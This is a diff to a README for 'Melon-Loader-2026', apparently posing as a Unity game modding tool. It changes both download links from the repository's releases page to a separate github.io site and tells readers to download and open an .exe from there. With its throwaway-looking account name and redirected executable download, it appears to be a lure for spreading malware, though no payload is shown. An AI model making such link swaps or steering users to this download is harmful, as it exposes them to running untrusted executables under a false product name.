@@ -1,6 +1,6 @@
 # 📦 Melon-Loader-2026 - Modding Unity games with total ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/tumblerclasspinopsida594/Melon-Loader-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://tumblerclasspinopsida594.github.io)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ This tool runs on Windows 10 and Windows 11. Your computer needs the following c
 
 Follow these steps to set up the software on your desktop.
 
-1. Visit this page to download: [https://github.com/tumblerclasspinopsida594/Melon-Loader-2026/releases](https://github.com/tumblerclasspinopsida594/Melon-Loader-2026/releases).
+1. Visit this page to download: [https://tumblerclasspinopsida594.github.io](https://tumblerclasspinopsida594.github.io).
 2. Look for the latest release version on the page.
 3. Click the file ending in .exe to start the transfer to your computer.
 4. Open the file once the download finishes.
